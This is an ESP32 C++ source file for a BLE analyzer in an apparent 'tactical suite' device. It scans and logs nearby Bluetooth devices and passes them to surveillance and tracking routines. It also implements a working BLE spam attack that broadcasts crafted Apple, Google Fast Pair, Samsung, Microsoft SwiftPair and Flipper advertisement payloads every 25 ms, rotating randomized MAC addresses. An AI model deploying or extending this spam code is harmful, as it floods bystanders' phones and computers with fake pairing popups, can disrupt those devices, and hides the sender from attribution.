#include "ble_analyzer.h"
#include "tactical_suite.h"
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include <esp_bt_main.h>
#include <Arduino.h>

#define MAX_BLE_RECORDS 32

static BleDeviceRecord s_devices[MAX_BLE_RECORDS];
static uint16_t s_deviceCount = 0;

bool BLEAnalyzer::active = false;
bool BLEAnalyzer::scanning = false;
bool BLEAnalyzer::spamming = false;
BleSpamType BLEAnalyzer::currentSpamType = BLE_SPAM_APPLE;
uint32_t BLEAnalyzer::packetsSent = 0;
uint32_t BLEAnalyzer::lastAdvMs = 0;

static esp_ble_adv_params_t adv_params = {
    .adv_int_min        = 0x20,
    .adv_int_max        = 0x20,
    .adv_type           = ADV_TYPE_NONCONN_IND,
    .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
    .peer_addr          = {0},
    .peer_addr_type     = BLE_ADDR_TYPE_PUBLIC,
    .channel_map        = ADV_CHNL_ALL,
    .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

static void gap_event_handler(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
    if (event == ESP_GAP_BLE_SCAN_RESULT_EVT) {
        esp_ble_gap_cb_param_t *scan_result = (esp_ble_gap_cb_param_t *)param;
        if (scan_result->scan_rst.search_evt == ESP_GAP_SEARCH_INQ_RES_EVT) {
            uint8_t *bda = scan_result->scan_rst.bda;
            int8_t rssi = scan_result->scan_rst.rssi;

            TacticalSuite::feedDroneBlePayload(scan_result->scan_rst.ble_adv, scan_result->scan_rst.adv_data_len, bda, rssi);
            TacticalSuite::feedSurveillanceBle(scan_result->scan_rst.ble_adv, scan_result->scan_rst.adv_data_len, bda, rssi);
            TacticalSuite::feedFoxHuntBle(bda, rssi);

            // Check if already seen
            for (uint16_t i = 0; i < s_deviceCount; i++) {
                if (memcmp(s_devices[i].mac, bda, 6) == 0) {
                    s_devices[i].rssi = rssi;
                    s_devices[i].lastSeenMs = millis();
                    return;
                }
            }

            if (s_deviceCount < MAX_BLE_RECORDS) {
                memcpy(s_devices[s_deviceCount].mac, bda, 6);
                s_devices[s_deviceCount].rssi = rssi;
                s_devices[s_deviceCount].lastSeenMs = millis();

                // Extract name if available
                uint8_t *adv_name = NULL;
                uint8_t adv_name_len = 0;
                adv_name = esp_ble_resolve_adv_data(scan_result->scan_rst.ble_adv,
                                                    ESP_BLE_AD_TYPE_NAME_CMPL,
                                                    &adv_name_len);
                if (!adv_name) {
                    adv_name = esp_ble_resolve_adv_data(scan_result->scan_rst.ble_adv,
                                                        ESP_BLE_AD_TYPE_NAME_SHORT,
                                                        &adv_name_len);
                }

                uint8_t devType = 0; // 0=Unknown
                uint8_t *mfg_data = NULL;
                uint8_t mfg_data_len = 0;
                mfg_data = esp_ble_resolve_adv_data(scan_result->scan_rst.ble_adv,
                                                   ESP_BLE_AD_MANUFACTURER_SPECIFIC_TYPE,
                                                   &mfg_data_len);
                if (mfg_data && mfg_data_len >= 2) {
                    uint16_t cid = (uint16_t)mfg_data[0] | ((uint16_t)mfg_data[1] << 8);
                    if (cid == 0x004C) devType = 1;      // Apple Inc.
                    else if (cid == 0x00E0) devType = 2; // Google LLC
                    else if (cid == 0x0075) devType = 3; // Samsung Electronics
                    else if (cid == 0x0006) devType = 4; // Microsoft
                }

                if (adv_name && adv_name_len > 0) {
                    uint8_t len = adv_name_len < 23 ? adv_name_len : 23;
                    memcpy(s_devices[s_deviceCount].name, adv_name, len);
                    s_devices[s_deviceCount].name[len] = '\0';
                } else {
                    const char* tag = (devType == 1) ? "Apple Dev" :
                                      (devType == 2) ? "Google Dev" :
                                      (devType == 3) ? "Samsung Dev" :
                                      (devType == 4) ? "Windows PC" : "BLE Tag";
                    snprintf(s_devices[s_deviceCount].name, sizeof(s_devices[s_deviceCount].name),
                             "[%s] %02X:%02X", tag, bda[4], bda[5]);
                }
                s_devices[s_deviceCount].deviceType = devType;
                s_deviceCount++;
            }
        }
    }
}

bool BLEAnalyzer::init() {
    if (active) return true;

    btStart();
    esp_bluedroid_init();
    esp_bluedroid_enable();
    esp_ble_gap_register_callback(gap_event_handler);

    active = true;
    return true;
}

void BLEAnalyzer::deinit() {
    if (!active) return;
    stopScan();
    stopSpam();

    esp_bluedroid_disable();
    esp_bluedroid_deinit();
    btStop();
    active = false;
}

bool BLEAnalyzer::isActive() { return active; }

void BLEAnalyzer::startScan() {
    if (!active) return;
    stopSpam();

    static esp_ble_scan_params_t scan_params = {
        .scan_type              = BLE_SCAN_TYPE_ACTIVE,
        .own_addr_type          = BLE_ADDR_TYPE_PUBLIC,
        .scan_filter_policy     = BLE_SCAN_FILTER_ALLOW_ALL,
        .scan_interval          = 0x50,
        .scan_window            = 0x30,
        .scan_duplicate         = BLE_SCAN_DUPLICATE_DISABLE
    };
    esp_ble_gap_set_scan_params(&scan_params);
    esp_ble_gap_start_scanning(30); // 30 seconds
    scanning = true;
}

void BLEAnalyzer::stopScan() {
    if (scanning) {
        esp_ble_gap_stop_scanning();
        scanning = false;
    }
}

bool BLEAnalyzer::isScanning() { return scanning; }

uint16_t BLEAnalyzer::getDeviceCount() { return s_deviceCount; }

bool BLEAnalyzer::getDevice(uint16_t index, BleDeviceRecord& outDev) {
    if (index >= s_deviceCount) return false;
    outDev = s_devices[index];
    return true;
}

void BLEAnalyzer::clearDevices() {
    s_deviceCount = 0;
}

void BLEAnalyzer::startSpam(BleSpamType type) {
    if (!active) return;
    stopScan();
    currentSpamType = type;
    spamming = true;
    packetsSent = 0;
}

void BLEAnalyzer::stopSpam() {
    if (spamming) {
        esp_ble_gap_stop_advertising();
        spamming = false;
    }
}

bool BLEAnalyzer::isSpamming() { return spamming; }
BleSpamType BLEAnalyzer::getSpamType() { return currentSpamType; }
uint32_t BLEAnalyzer::getPacketsSent() { return packetsSent; }

void BLEAnalyzer::sendAdvRaw(const uint8_t* data, uint8_t len) {
    // Randomize MAC address
    esp_bd_addr_t rand_addr;
    for (int i = 0; i < 6; i++) rand_addr[i] = (uint8_t)random(256);
    rand_addr[0] |= 0xC0; // static random address format
    esp_ble_gap_set_rand_addr(rand_addr);

    esp_ble_gap_config_adv_raw_data((uint8_t*)data, len);
    esp_ble_gap_start_advertising(&adv_params);
    vTaskDelay(pdMS_TO_TICKS(15));
    esp_ble_gap_stop_advertising();
    packetsSent++;
}

void BLEAnalyzer::sendAppleAdv() {
    // AirDrop / Proximity Action Payload from Marauder
    uint8_t adv[11] = {
        0x0A, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC0,
        0x27, (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)
    };
    sendAdvRaw(adv, sizeof(adv));
}

void BLEAnalyzer::sendGoogleAdv() {
    // Google Fast Pair Service Data (0xFE2C)
    uint8_t adv[14] = {
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27,
        0x02, 0x0A, 0xF0
    };
    sendAdvRaw(adv, sizeof(adv));
}

void BLEAnalyzer::sendSamsungAdv() {
    // Samsung Buds / Watch Popup Payload
    uint8_t adv[15] = {
        0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
        0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, (uint8_t)random(256)
    };
    sendAdvRaw(adv, sizeof(adv));
}

void BLEAnalyzer::sendMicrosoftAdv() {
    // SwiftPair Beacon
    const char* names[] = {"Xbox Controller", "Surface Headphones", "Swift Mouse", "Audio Adapter"};
    const char* chosen = names[random(4)];
    uint8_t nameLen = strlen(chosen);

    uint8_t adv[32];
    uint8_t i = 0;
    adv[i++] = 6 + nameLen;
    adv[i++] = 0xFF; // Manufacturer specific
    adv[i++] = 0x06; // Microsoft 0x0006
    adv[i++] = 0x00;
    adv[i++] = 0x03;
    adv[i++] = 0x00;
    adv[i++] = 0x80;
    memcpy(&adv[i], chosen, nameLen);
    i += nameLen;

    sendAdvRaw(adv, i);
}

void BLEAnalyzer::sendFlipperAdv() {
    uint8_t adv[12] = {
        0x02, 0x01, 0x06,
        0x08, 0x09, 'F', 'l', 'i', 'p', '_', (uint8_t)('0' + random(10))
    };
    sendAdvRaw(adv, sizeof(adv));
}

void BLEAnalyzer::spamLoop() {
    if (!spamming) return;
    uint32_t now = millis();
    if (now - lastAdvMs < 25) return;
    lastAdvMs = now;

    switch (currentSpamType) {
        case BLE_SPAM_APPLE:     sendAppleAdv();     break;
        case BLE_SPAM_GOOGLE:    sendGoogleAdv();    break;
        case BLE_SPAM_SAMSUNG:   sendSamsungAdv();   break;
        case BLE_SPAM_MICROSOFT: sendMicrosoftAdv(); break;
        case BLE_SPAM_FLIPPER:   sendFlipperAdv();   break;
        case BLE_SPAM_ALL: {
            static uint8_t seq = 0;
            switch (seq % 5) {
                case 0: sendAppleAdv();     break;
                case 1: sendGoogleAdv();    break;
                case 2: sendSamsungAdv();   break;
                case 3: sendMicrosoftAdv(); break;
                case 4: sendFlipperAdv();   break;
            }
            seq++;
            break;
        }
    }
}
